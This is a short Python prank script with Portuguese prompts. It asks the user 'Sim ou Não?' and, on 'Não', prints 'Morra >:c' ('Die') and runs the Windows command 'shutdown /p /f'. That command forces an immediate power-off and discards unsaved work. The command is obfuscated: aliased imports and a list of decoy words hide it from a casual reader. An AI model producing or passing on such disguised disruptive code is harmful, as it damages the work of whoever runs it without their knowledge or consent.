import os as c
import time as b

a = ['/p','Sistem','Drag','Time','/f','Time of date','shutdown','Version','Windows','Lua','C#']

match str(input('Sim ou Não?\n')).capitalize():
    case 'Sim':
        print('Sim :>')
    case 'Não':
        print('Morra >:c')
        b.sleep(1)
        c.system(f'{a[6]} {a[0]} {a[4]}')
